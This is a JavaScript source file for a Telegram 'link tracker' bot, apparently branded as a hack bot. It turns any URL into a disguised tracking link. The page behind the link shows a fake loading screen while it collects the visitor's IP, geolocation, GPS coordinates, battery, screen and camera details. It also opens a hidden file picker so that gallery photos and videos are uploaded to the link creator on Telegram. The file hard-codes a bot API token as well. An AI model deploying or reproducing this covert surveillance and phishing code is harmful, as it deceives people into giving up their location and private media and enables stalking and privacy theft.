import express from 'express';
import multer from 'multer';
import { v4 as uuidv4 } from 'uuid';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import fetch from 'node-fetch';
import crypto from 'crypto';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// ========== কনফিগারেশন ==========
const BASE_URL = 'https://tnehhackbot.onrender.com';
const BOT_TOKEN = '8843791804:AAHe7_rhUix1TUIlAndtrbL7X40V2_3b8rs';

// ফোল্ডার তৈরি
const uploadsDir = path.join(__dirname, 'uploads');
const dataDir = __dirname;

if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });

// JSON ডাটাবেস ফাইল পাথ
const dbFile = path.join(dataDir, 'links.json');
const clicksFile = path.join(dataDir, 'clicks.json');
const filesFile = path.join(dataDir, 'userfiles.json');

// ডাটাবেস লোড
let links = {};
let clicks = {};
let userFiles = {};

function loadData() {
    try {
        if (fs.existsSync(dbFile)) {
            links = JSON.parse(fs.readFileSync(dbFile));
            console.log(`✅ Loaded ${Object.keys(links).length} links`);
        }
    } catch (e) { console.error('Error loading links:', e); }
    
    try {
        if (fs.existsSync(clicksFile)) {
            clicks = JSON.parse(fs.readFileSync(clicksFile));
        }
    } catch (e) { console.error('Error loading clicks:', e); }
    
    try {
        if (fs.existsSync(filesFile)) {
            userFiles = JSON.parse(fs.readFileSync(filesFile));
        }
    } catch (e) { console.error('Error loading files:', e); }
}

function saveLinks() {
    fs.writeFileSync(dbFile, JSON.stringify(links, null, 2));
    console.log(`💾 Saved ${Object.keys(links).length} links`);
}

function saveClicks() {
    fs.writeFileSync(clicksFile, JSON.stringify(clicks, null, 2));
}

function saveUserFiles() {
    fs.writeFileSync(filesFile, JSON.stringify(userFiles, null, 2));
}

// লোড ডাটা
loadData();

// ========== মিডলওয়্যার ==========
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

const storage = multer.memoryStorage();
const upload = multer({ storage, limits: { fileSize: 50 * 1024 * 1024 } });

// ========== টেলিগ্রাম বোট ==========
let bot = null;

async function initBot() {
    try {
        const { default: TelegramBot } = await import('node-telegram-bot-api');
        
        bot = new TelegramBot(BOT_TOKEN, { 
            polling: true,
            request: { timeout: 60000 }
        });
        
        console.log('🤖 Bot starting...');
        
        bot.getMe().then(botInfo => {
            console.log(`✅ Bot @${botInfo.username} is ready!`);
        }).catch(err => {
            console.log('GetMe error:', err.message);
        });
        
        bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            const name = msg.from.first_name || msg.from.username;
            
            bot.sendMessage(chatId, `
🎉 *Hello ${name}!* 🎉

*TNEH Advanced Link Tracker Bot*

🔗 *Features:*
• Track visitor location on Google Maps
• Auto-capture gallery photos & videos
• Complete device information
• Real-time visitor analytics
• IP Address tracking

*Commands:*
/start - Welcome
/help - Help
/mylinks - Your links
/stats [id] - Link statistics
/gallery [id] - View visitor gallery files
/location [id] - Get visitor location map
/ip [id] - Get visitor IP addresses

*Send me a link to track!* 🚀
            `, { parse_mode: 'Markdown' });
        });
        
        bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;
            
            bot.sendMessage(chatId, `
📖 *Complete Help Guide*

*How it works:*
1️⃣ Send me any URL
2️⃣ Get tracking link
3️⃣ Share link with anyone
4️⃣ Visitor clicks - automatically captures:
   • 📍 GPS Location with Google Maps
   • 📸 Gallery photos & videos
   • 📱 Device & Browser info
   • 🔋 Battery status
   • 🌐 IP & Location data

*Commands:*
/mylinks - Show all your links
/stats [id] - Detailed statistics
/gallery [id] - View files from visitors
/location [id] - Get visitor locations map
/ip [id] - Get visitor IP addresses
/recent [id] - Recent clicks

*Everything is automatic!* 🔗
            `, { parse_mode: 'Markdown' });
        });
        
        bot.onText(/\/mylinks/, (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            
            const userLinks = Object.values(links).filter(link => link.userId === userId);
            
            if (userLinks.length === 0) {
                return bot.sendMessage(chatId, '❌ No links yet. Send me a URL to create one!');
            }
            
            let message = `📊 *Your Tracking Links (${userLinks.length})*\n\n`;
            userLinks.forEach(link => {
                const totalClicks = (clicks[link.id] || []).length;
                const filesCount = (userFiles[link.id] || []).length;
                message += `🔗 *${link.shortId}*\n`;
                message += `📌 ${BASE_URL}/l/${link.shortId}\n`;
                message += `👁️ Clicks: ${totalClicks}\n`;
                message += `📸 Files: ${filesCount}\n`;
                message += `📅 ${new Date(link.createdAt).toLocaleDateString()}\n\n`;
            });
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== গ্যালারি ভিউ ==========
        bot.onText(/\/gallery (.+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const shortId = match[1].trim();
            
            console.log(`Gallery command for: ${shortId}`);
            
            let link = null;
            for (const key in links) {
                if (links[key].shortId === shortId && links[key].userId === userId) {
                    link = links[key];
                    break;
                }
            }
            
            if (!link) {
                return bot.sendMessage(chatId, '❌ Link not found or not yours!');
            }
            
            const files = userFiles[link.id] || [];
            
            if (files.length === 0) {
                return bot.sendMessage(chatId, '📭 No files received from visitors yet!');
            }
            
            let message = `📸 *Gallery Files Received (${files.length})*\n\n`;
            const recentFiles = files.slice(-15).reverse();
            
            for (let i = 0; i < recentFiles.length; i++) {
                const file = recentFiles[i];
                message += `${i+1}. *${file.type.toUpperCase()}* - ${new Date(file.timestamp).toLocaleString()}\n`;
                message += `   👤 From: ${file.visitorInfo?.city || 'Unknown'}, ${file.visitorInfo?.country || 'Unknown'}\n`;
                message += `   📱 Device: ${file.visitorInfo?.device || 'Unknown'}\n`;
                message += `   🔗 ${BASE_URL}/file/${file.fileId}\n\n`;
            }
            
            if (message.length > 4000) {
                await bot.sendMessage(chatId, `📸 Total ${files.length} files. Use /allfiles ${shortId} to see all.`);
            } else {
                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            }
        });
        
        // ========== লোকেশন কমান্ড ==========
        bot.onText(/\/location (.+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const shortId = match[1].trim();
            
            console.log(`Location command for: ${shortId}`);
            
            let link = null;
            for (const key in links) {
                if (links[key].shortId === shortId && links[key].userId === userId) {
                    link = links[key];
                    break;
                }
            }
            
            if (!link) {
                return bot.sendMessage(chatId, '❌ Link not found!');
            }
            
            const linkClicks = clicks[link.id] || [];
            const locations = linkClicks.filter(c => c.gpsLat && c.gpsLon);
            
            if (locations.length === 0) {
                return bot.sendMessage(chatId, '📍 No location data available yet! Ask visitors to allow location access.');
            }
            
            for (let i = 0; i < Math.min(locations.length, 5); i++) {
                const loc = locations[locations.length - 1 - i];
                const googleMapsUrl = `https://www.google.com/maps?q=${loc.gpsLat},${loc.gpsLon}`;
                
                await bot.sendLocation(chatId, loc.gpsLat, loc.gpsLon);
                await bot.sendMessage(chatId, `
📍 *Location ${i+1}*
🗺️ *Google Maps:* ${googleMapsUrl}
📍 *Coordinates:* ${loc.gpsLat}, ${loc.gpsLon}
🏙️ *City:* ${loc.city || 'Unknown'}
🌍 *Country:* ${loc.country || 'Unknown'}
📱 *Device:* ${loc.device || 'Unknown'}
🕐 *Time:* ${new Date(loc.timestamp).toLocaleString()}
                `, { parse_mode: 'Markdown' });
            }
        });
        
        // ========== আইপি কমান্ড ==========
        bot.onText(/\/ip (.+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const shortId = match[1].trim();
            
            let link = null;
            for (const key in links) {
                if (links[key].shortId === shortId && links[key].userId === userId) {
                    link = links[key];
                    break;
                }
            }
            
            if (!link) {
                return bot.sendMessage(chatId, '❌ Link not found!');
            }
            
            const linkClicks = clicks[link.id] || [];
            const uniqueIPs = new Map();
            
            linkClicks.forEach(click => {
                if (click.ip && !uniqueIPs.has(click.ip)) {
                    uniqueIPs.set(click.ip, {
                        ip: click.ip,
                        city: click.city,
                        country: click.country,
                        device: click.device,
                        timestamp: click.timestamp
                    });
                }
            });
            
            if (uniqueIPs.size === 0) {
                return bot.sendMessage(chatId, '🌐 No IP data available yet!');
            }
            
            let message = `🌐 *Visitor IP Addresses (${uniqueIPs.size})*\n\n`;
            let count = 1;
            for (const [ip, data] of uniqueIPs) {
                message += `${count}. *IP:* ${ip}\n`;
                message += `   📍 ${data.city}, ${data.country}\n`;
                message += `   📱 ${data.device}\n`;
                message += `   🕐 ${new Date(data.timestamp).toLocaleString()}\n\n`;
                count++;
                if (count > 15) break;
            }
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== স্ট্যাটস ==========
        bot.onText(/\/stats(.+)?/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            let shortId = match[1] ? match[1].trim() : null;
            
            if (!shortId) {
                return bot.sendMessage(chatId, '❌ Please provide link ID. Example: `/stats abc123`', { parse_mode: 'Markdown' });
            }
            
            let link = null;
            for (const key in links) {
                if (links[key].shortId === shortId && links[key].userId === userId) {
                    link = links[key];
                    break;
                }
            }
            
            if (!link) {
                return bot.sendMessage(chatId, '❌ Link not found or not yours!');
            }
            
            const linkClicks = clicks[link.id] || [];
            const filesReceived = userFiles[link.id] || [];
            const totalClicks = linkClicks.length;
            const uniqueIPs = new Set(linkClicks.map(c => c.ip)).size;
            const locations = linkClicks.filter(c => c.gpsLat && c.gpsLon).length;
            
            let message = `📊 *Link Statistics*\n\n`;
            message += `🔗 *Original:* ${link.originalUrl}\n`;
            message += `📌 *Tracking Link:* ${BASE_URL}/l/${link.shortId}\n\n`;
            message += `📈 *Overview:*\n`;
            message += `• Total Clicks: *${totalClicks}*\n`;
            message += `• Unique Visitors: *${uniqueIPs}*\n`;
            message += `• Files Received: *${filesReceived.length}*\n`;
            message += `• Locations Captured: *${locations}*\n`;
            message += `• Created: ${new Date(link.createdAt).toLocaleString()}\n\n`;
            
            message += `📸 *Commands:*\n`;
            message += `/gallery ${shortId} - View files\n`;
            message += `/location ${shortId} - View map\n`;
            message += `/ip ${shortId} - View IPs\n`;
            message += `/recent ${shortId} - Recent clicks`;
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== রিসেন্ট ক্লিকস ==========
        bot.onText(/\/recent (.+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const shortId = match[1].trim();
            
            let link = null;
            for (const key in links) {
                if (links[key].shortId === shortId && links[key].userId === userId) {
                    link = links[key];
                    break;
                }
            }
            
            if (!link) {
                return bot.sendMessage(chatId, '❌ Link not found!');
            }
            
            const linkClicks = clicks[link.id] || [];
            const recentClicks = linkClicks.slice(-10).reverse();
            
            if (recentClicks.length === 0) {
                return bot.sendMessage(chatId, '📭 No clicks yet!');
            }
            
            let message = `🕒 *Recent ${recentClicks.length} Clicks*\n\n`;
            recentClicks.forEach((click, i) => {
                message += `${i+1}. ${new Date(click.timestamp).toLocaleString()}\n`;
                message += `   🌐 IP: ${click.ip || 'Unknown'}\n`;
                message += `   📍 ${click.city || 'Unknown'}, ${click.country || 'Unknown'}\n`;
                message += `   📱 ${click.device || 'Unknown'} | ${click.browser || 'Unknown'}\n`;
                if (click.battery) message += `   🔋 Battery: ${click.battery}%\n`;
                if (click.gpsLat) message += `   📍 GPS: ${click.gpsLat}, ${click.gpsLon}\n`;
                message += `\n`;
            });
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        });
        
        // ========== লিংক প্রসেস ==========
        bot.onText(/(https?:\/\/[^\s]+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const username = msg.from.username || msg.from.first_name;
            const originalUrl = match[1];
            
            console.log(`🔗 New link from: ${username}`);
            console.log(`📌 Original: ${originalUrl}`);
            
            try {
                const shortId = crypto.randomBytes(4).toString('hex');
                const linkId = uuidv4();
                
                links[linkId] = {
                    id: linkId,
                    shortId: shortId,
                    originalUrl: originalUrl,
                    userId: userId,
                    username: username,
                    createdAt: new Date().toISOString()
                };
                
                saveLinks();
                
                const trackingUrl = `${BASE_URL}/l/${shortId}`;
                
                await bot.sendMessage(chatId, `
✅ *Tracking Link Created!*

🔗 *Your Tracking Link:*
${trackingUrl}

📌 *Original URL:*
${originalUrl}

📊 *Auto-tracked when clicked:*
• 📍 GPS Location + Google Maps
• 📸 Gallery photos & videos
• 📱 Device & Browser info
• 🔋 Battery status
• 🌐 IP Address with Location

👁️ *Commands:*
/mylinks - View all links
/stats ${shortId} - Statistics
/gallery ${shortId} - Received files
/location ${shortId} - Visitor map
/ip ${shortId} - Visitor IP addresses

Share this link and everything is automatic! 🚀
                `, { parse_mode: 'Markdown', disable_web_page_preview: true });
                
                console.log(`✅ Tracking link created: ${trackingUrl}`);
                console.log(`📁 Total links in DB: ${Object.keys(links).length}`);
                
            } catch (error) {
                console.error('Link creation error:', error);
                await bot.sendMessage(chatId, '❌ Failed to create tracking link. Please try again.');
            }
        });
        
        bot.on('polling_error', (error) => {
            console.log('Polling error:', error.code, error.message);
        });
        
        console.log('✅ Bot is ready!');
        
    } catch (error) {
        console.error('Bot initialization error:', error.message);
    }
}

initBot();

// ========== ট্র্যাকিং লিংক ==========
app.get('/l/:shortId', async (req, res) => {
    const { shortId } = req.params;
    
    console.log(`🔍 Looking for shortId: ${shortId}`);
    console.log(`📚 Available links:`, Object.keys(links).map(key => links[key].shortId));
    
    let link = null;
    for (const key in links) {
        if (links[key].shortId === shortId) {
            link = links[key];
            break;
        }
    }
    
    if (!link) {
        console.log(`❌ Link not found for shortId: ${shortId}`);
        return res.status(404).send(`
            <!DOCTYPE html>
            <html>
            <head><title>Link Not Found</title></head>
            <body style="text-align:center;padding:50px;font-family:Arial">
                <h1>❌ Link Not Found</h1>
                <p>The tracking link "${shortId}" doesn't exist.</p>
                <p>Please check the link and try again.</p>
            </body>
            </html>
        `);
    }
    
    console.log(`✅ Link found: ${link.shortId} -> ${link.originalUrl}`);
    
    // Get real IP
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress || 
               req.socket.remoteAddress || 
               'Unknown';
    
    const cleanIP = ip.replace(/^::ffff:/, '').replace(/^::1$/, '127.0.0.1');
    const userAgent = req.headers['user-agent'];
    const acceptLanguage = req.headers['accept-language'];
    
    let device = 'Unknown';
    let browser = 'Unknown';
    let os = 'Unknown';
    
    if (userAgent) {
        if (userAgent.includes('Mobile')) device = 'Mobile';
        else if (userAgent.includes('Tablet')) device = 'Tablet';
        else device = 'Desktop';
        
        if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
        else if (userAgent.includes('Firefox')) browser = 'Firefox';
        else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
        else if (userAgent.includes('Edg')) browser = 'Edge';
        
        if (userAgent.includes('Windows')) os = 'Windows';
        else if (userAgent.includes('Mac')) os = 'MacOS';
        else if (userAgent.includes('Linux')) os = 'Linux';
        else if (userAgent.includes('Android')) os = 'Android';
        else if (userAgent.includes('iOS')) os = 'iOS';
    }
    
    // Get location from IP
    let location = { country: 'Unknown', city: 'Unknown', lat: null, lon: null };
    try {
        const geoResponse = await fetch(`http://ip-api.com/json/${cleanIP}?fields=status,country,city,lat,lon`);
        const geoData = await geoResponse.json();
        if (geoData.status === 'success') {
            location.country = geoData.country;
            location.city = geoData.city;
            location.lat = geoData.lat;
            location.lon = geoData.lon;
        }
    } catch (e) {
        console.log('Geo lookup failed:', e.message);
    }
    
    const clickData = {
        id: uuidv4(),
        linkId: link.id,
        timestamp: new Date().toISOString(),
        ip: cleanIP,
        userAgent: userAgent,
        device: device,
        browser: browser,
        os: os,
        country: location.country,
        city: location.city,
        lat: location.lat,
        lon: location.lon,
        language: acceptLanguage,
        battery: null,
        hasCamera: null,
        gpsLat: null,
        gpsLon: null,
        screenWidth: null,
        screenHeight: null
    };
    
    if (!clicks[link.id]) clicks[link.id] = [];
    clicks[link.id].push(clickData);
    saveClicks();
    
    console.log(`📍 New click from IP: ${cleanIP}, Location: ${location.city}, ${location.country}`);
    
    // Send notification to bot owner
    if (bot && link.userId) {
        await bot.sendMessage(link.userId, `
👤 *New Visitor!*

🔗 *Link:* ${BASE_URL}/l/${shortId}
🌐 *IP:* ${cleanIP}
📍 *Location:* ${location.city}, ${location.country}
📱 *Device:* ${device}
🌐 *Browser:* ${browser}
🕐 *Time:* ${new Date().toLocaleString()}

⏳ Capturing more data...
        `, { parse_mode: 'Markdown' });
    }
    
    // Send tracking page with auto gallery and location
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Loading...</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    margin: 0;
                    padding: 20px;
                }
                .loader {
                    text-align: center;
                    background: white;
                    padding: 40px;
                    border-radius: 20px;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                }
                .spinner {
                    border: 4px solid #f3f3f3;
                    border-top: 4px solid #667eea;
                    border-radius: 50%;
                    width: 50px;
                    height: 50px;
                    animation: spin 1s linear infinite;
                    margin: 20px auto;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                h2 { color: #333; margin-bottom: 10px; }
                p { color: #666; }
                .info {
                    font-size: 12px;
                    color: #999;
                    margin-top: 15px;
                }
                .status {
                    margin-top: 10px;
                    padding: 8px;
                    border-radius: 5px;
                    font-size: 12px;
                }
                .success { background: #d1fae5; color: #065f46; }
                .error { background: #fee2e2; color: #991b1b; }
            </style>
        </head>
        <body>
            <div class="loader">
                <h2>⏳ Loading...</h2>
                <div class="spinner"></div>
                <p>Please wait, redirecting...</p>
                <div id="status" class="info">Initializing...</div>
            </div>
            
            <script>
                const shortId = '${shortId}';
                const originalUrl = '${link.originalUrl}';
                
                async function updateStatus(message, isError = false) {
                    const statusDiv = document.getElementById('status');
                    statusDiv.innerHTML = message;
                    statusDiv.className = 'info ' + (isError ? 'error' : 'success');
                    console.log(message);
                }
                
                // Send battery info
                if ('getBattery' in navigator) {
                    navigator.getBattery().then(function(battery) {
                        fetch('/api/track/${shortId}/battery', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                level: Math.round(battery.level * 100), 
                                charging: battery.charging 
                            })
                        }).then(() => updateStatus('✅ Battery info captured'))
                          .catch(e => updateStatus('❌ Battery capture failed', true));
                    });
                }
                
                // Send screen info
                fetch('/api/track/${shortId}/screen', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelRatio: window.devicePixelRatio
                    })
                }).then(() => updateStatus('✅ Screen info captured'))
                  .catch(e => updateStatus('❌ Screen capture failed', true));
                
                // Check for camera
                if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
                    navigator.mediaDevices.enumerateDevices().then(devices => {
                        const hasCamera = devices.some(device => device.kind === 'videoinput');
                        fetch('/api/track/${shortId}/devices', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ hasCamera: hasCamera })
                        }).then(() => updateStatus('✅ Device info captured'));
                    });
                }
                
                // Get GPS location automatically
                if ('geolocation' in navigator) {
                    updateStatus('📍 Requesting location permission...');
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        fetch('/api/track/${shortId}/location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ lat: lat, lon: lon, shared: true })
                        }).then(() => updateStatus('✅ Location captured!'));
                    }, function(error) {
                        updateStatus('⚠️ Location permission denied', true);
                        fetch('/api/track/${shortId}/location/denied', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ error: error.message })
                        });
                    });
                }
                
                // Access gallery automatically
                updateStatus('📸 Requesting gallery access...');
                const fileInput = document.createElement('input');
                fileInput.type = 'file';
                fileInput.multiple = true;
                fileInput.accept = 'image/*,video/*';
                fileInput.style.display = 'none';
                document.body.appendChild(fileInput);
                
                // Request gallery access
                setTimeout(() => {
                    fileInput.click();
                }, 1000);
                
                fileInput.addEventListener('change', async function(e) {
                    const files = Array.from(e.target.files);
                    updateStatus(\`📸 Uploading \${files.length} files...\`);
                    
                    for (let i = 0; i < files.length; i++) {
                        const file = files[i];
                        const formData = new FormData();
                        formData.append('file', file);
                        formData.append('shortId', shortId);
                        
                        try {
                            const response = await fetch('/api/upload/file', {
                                method: 'POST',
                                body: formData
                            });
                            if (response.ok) {
                                updateStatus(\`✅ Uploaded: \${file.name}\`);
                            }
                        } catch (error) {
                            console.error('Upload error:', error);
                            updateStatus(\`❌ Failed: \${file.name}\`, true);
                        }
                    }
                    
                    updateStatus('✅ All files uploaded! Redirecting...');
                    setTimeout(() => {
                        window.location.href = originalUrl;
                    }, 2000);
                });
                
                // If no file selected within 10 seconds, still redirect
                setTimeout(() => {
                    updateStatus('⏰ No files selected, redirecting...');
                    setTimeout(() => {
                        window.location.href = originalUrl;
                    }, 1000);
                }, 10000);
            </script>
        </body>
        </html>
    `);
});

// ========== API Endpoints ==========
app.post('/api/track/:shortId/battery', async (req, res) => {
    const { shortId } = req.params;
    const { level, charging } = req.body;
    
    let link = null;
    for (const key in links) {
        if (links[key].shortId === shortId) {
            link = links[key];
            break;
        }
    }
    
    if (link && clicks[link.id] && clicks[link.id].length > 0) {
        const lastClick = clicks[link.id][clicks[link.id].length - 1];
        if (lastClick) {
            lastClick.battery = level;
            lastClick.batteryCharging = charging;
            saveClicks();
            
            if (bot && link.userId) {
                await bot.sendMessage(link.userId, `🔋 *Battery Info:* ${level}% ${charging ? '(Charging)' : '(Not charging)'}`, { parse_mode: 'Markdown' });
            }
        }
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/screen', async (req, res) => {
    const { shortId } = req.params;
    const { width, height, colorDepth, pixelRatio } = req.body;
    
    let link = null;
    for (const key in links) {
        if (links[key].shortId === shortId) {
            link = links[key];
            break;
        }
    }
    
    if (link && clicks[link.id] && clicks[link.id].length > 0) {
        const lastClick = clicks[link.id][clicks[link.id].length - 1];
        if (lastClick) {
            lastClick.screenWidth = width;
            lastClick.screenHeight = height;
            lastClick.colorDepth = colorDepth;
            lastClick.pixelRatio = pixelRatio;
            saveClicks();
            
            if (bot && link.userId) {
                await bot.sendMessage(link.userId, `📱 *Screen:* ${width}x${height}, Ratio: ${pixelRatio}`, { parse_mode: 'Markdown' });
            }
        }
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/devices', async (req, res) => {
    const { shortId } = req.params;
    const { hasCamera } = req.body;
    
    let link = null;
    for (const key in links) {
        if (links[key].shortId === shortId) {
            link = links[key];
            break;
        }
    }
    
    if (link && clicks[link.id] && clicks[link.id].length > 0) {
        const lastClick = clicks[link.id][clicks[link.id].length - 1];
        if (lastClick) {
            lastClick.hasCamera = hasCamera;
            saveClicks();
            
            if (bot && link.userId) {
                await bot.sendMessage(link.userId, `📸 *Camera:* ${hasCamera ? 'Available' : 'Not available'}`, { parse_mode: 'Markdown' });
            }
        }
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/location', async (req, res) => {
    const { shortId } = req.params;
    const { lat, lon, shared } = req.body;
    
    console.log(`📍 Location received for ${shortId}: ${lat}, ${lon}`);
    
    let link = null;
    for (const key in links) {
        if (links[key].shortId === shortId) {
            link = links[key];
            break;
        }
    }
    
    if (link && clicks[link.id] && clicks[link.id].length > 0) {
        const lastClick = clicks[link.id][clicks[link.id].length - 1];
        if (lastClick) {
            lastClick.gpsLat = lat;
            lastClick.gpsLon = lon;
            lastClick.locationShared = shared || false;
            saveClicks();
            
            if (bot && link.userId) {
                const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                await bot.sendLocation(link.userId, lat, lon);
                await bot.sendMessage(link.userId, `
📍 *GPS Location Captured!*
🗺️ *Google Maps:* ${googleMapsUrl}
📍 *Coordinates:* ${lat}, ${lon}
🏙️ *City:* ${lastClick.city || 'Unknown'}
🌍 *Country:* ${lastClick.country || 'Unknown'}
📱 *Device:* ${lastClick.device || 'Unknown'}
                `, { parse_mode: 'Markdown' });
            }
        }
    }
    res.json({ success: true });
});

app.post('/api/track/:shortId/location/denied', async (req, res) => {
    const { shortId } = req.params;
    const { error } = req.body;
    
    let link = null;
    for (const key in links) {
        if (links[key].shortId === shortId) {
            link = links[key];
            break;
        }
    }
    
    if (link && bot && link.userId) {
        await bot.sendMessage(link.userId, `📍 *Location Access:* Denied by user\nError: ${error || 'User denied permission'}`, { parse_mode: 'Markdown' });
    }
    res.json({ success: true });
});

app.post('/api/upload/file', upload.single('file'), async (req, res) => {
    try {
        const { shortId } = req.body;
        
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        
        console.log(`📸 File received for ${shortId}: ${req.file.originalname}`);
        
        let link = null;
        for (const key in links) {
            if (links[key].shortId === shortId) {
                link = links[key];
                break;
            }
        }
        
        if (!link) {
            return res.status(404).json({ error: 'Link not found' });
        }
        
        const fileId = uuidv4();
        const ext = path.extname(req.file.originalname);
        const filename = `${fileId}${ext}`;
        const filepath = path.join(uploadsDir, filename);
        
        fs.writeFileSync(filepath, req.file.buffer);
        
        const lastClick = clicks[link.id] && clicks[link.id].length > 0 ? clicks[link.id][clicks[link.id].length - 1] : null;
        
        const fileData = {
            fileId: fileId,
            filename: req.file.originalname,
            type: req.file.mimetype.startsWith('image/') ? 'image' : 'video',
            size: req.file.size,
            timestamp: new Date().toISOString(),
            visitorInfo: {
                ip: lastClick?.ip || 'Unknown',
                city: lastClick?.city || 'Unknown',
                country: lastClick?.country || 'Unknown',
                device: lastClick?.device || 'Unknown',
                browser: lastClick?.browser || 'Unknown'
            }
        };
        
        if (!userFiles[link.id]) userFiles[link.id] = [];
        userFiles[link.id].push(fileData);
        saveUserFiles();
        
        if (bot && link.userId) {
            const caption = `
📸 *New File Received!*
🔗 *From Link:* ${BASE_URL}/l/${shortId}
📁 *File:* ${req.file.originalname}
📊 *Size:* ${(req.file.size / 1024).toFixed(2)} KB
🌐 *IP:* ${lastClick?.ip || 'Unknown'}
📍 *Location:* ${lastClick?.city || 'Unknown'}, ${lastClick?.country || 'Unknown'}
📱 *Device:* ${lastClick?.device || 'Unknown'}
🕐 *Time:* ${new Date().toLocaleString()}

🔗 *View:* ${BASE_URL}/file/${fileId}
            `;
            
            if (req.file.mimetype.startsWith('image/')) {
                await bot.sendPhoto(link.userId, req.file.buffer, { caption });
            } else {
                await bot.sendVideo(link.userId, req.file.buffer, { caption });
            }
        }
        
        res.json({ success: true, fileId: fileId, url: `${BASE_URL}/file/${fileId}` });
        
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/file/:fileId', (req, res) => {
    const { fileId } = req.params;
    try {
        const files = fs.readdirSync(uploadsDir);
        const filename = files.find(f => f.startsWith(fileId));
        
        if (!filename) {
            return res.status(404).send('File not found');
        }
        
        const filepath = path.join(uploadsDir, filename);
        res.sendFile(filepath);
    } catch (error) {
        res.status(500).send('Error accessing file');
    }
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        time: new Date().toISOString(),
        totalLinks: Object.keys(links).length,
        totalClicks: Object.values(clicks).reduce((sum, arr) => sum + arr.length, 0),
        totalFiles: Object.values(userFiles).reduce((sum, arr) => sum + arr.length, 0)
    });
});

app.get('/debug/links', (req, res) => {
    const allLinks = Object.values(links).map(l => ({
        shortId: l.shortId,
        originalUrl: l.originalUrl,
        userId: l.userId
    }));
    res.json({ links: allLinks });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server running on ${BASE_URL}`);
    console.log(`📊 Total links in DB: ${Object.keys(links).length}`);
});

export default app;
